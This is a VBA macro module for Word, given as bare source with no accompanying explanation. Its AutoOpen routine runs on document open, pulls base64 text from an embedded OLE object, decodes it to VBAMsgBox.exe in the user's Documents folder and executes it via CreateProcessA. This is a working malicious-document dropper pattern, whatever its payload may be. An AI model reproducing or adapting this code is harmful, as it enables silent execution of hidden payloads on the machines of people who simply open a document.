Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Byte
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As LongPtr
    bInheritHandle As Long
End Type

Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByRef lpEnvironment As Any, ByVal lpCurrentDirectory As String, ByRef lpStartupInfo As STARTUPINFO, ByRef lpProcessInformation As PROCESS_INFORMATION) As Long

Sub AutoOpen()

Call SaveAndOpenRTF

End Sub

Sub SaveAndOpenRTF()

Dim udtProc As PROCESS_INFORMATION, udtStart As STARTUPINFO
Dim sec1 As SECURITY_ATTRIBUTES
Dim sec2 As SECURITY_ATTRIBUTES
Dim ShowCommand As VbAppWinStyle

Dim X As Object
Dim RTFDoc As Word.Document
Dim FilePath As String
Dim strData As String
Dim strTempPath As String

Set X = CreateObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")

ActiveDocument.Shapes(1).OLEFormat.Object.Range.Copy

X.GetFromClipBoard
strData = X.GetText(1)

strTempPath = "C:\Users\" & Environ("USERNAME") & "\Documents\VBAMsgBox.exe"
Open strTempPath For Binary As #1
    Put #1, 1, DecodeBase64(strData)
Close #1

Const STARTF_USESHOWWINDOW = &H1&
Const NORMAL_PRIORITY_CLASS = &H20&
ShowCommand = vbNormalFocus

udtStart.cb = Len(udtStart)
udtStart.dwFlags = STARTF_USESHOWWINDOW
udtStart.wShowWindow = ShowCommand

sec1.nLength = Len(sec1)
sec2.nLength = Len(sec2)

CreateProcessA vbNullString, strTempPath, sec1, sec2, False, NORMAL_PRIORITY_CLASS, ByVal 0&, vbNullString, udtStart, udtProc

Set X = Nothing

End Sub

Function DecodeBase64(ByVal strData As String) As Byte()

Dim objXML As Object
Dim objNode As Object

Set objXML = CreateObject("MSXML2.DOMDocument")
Set objNode = objXML.createElement("b64")
objNode.DataType = "bin.base64"
objNode.Text = strData
DecodeBase64 = objNode.nodeTypedValue

Set objNode = Nothing
Set objXML = Nothing

End Function
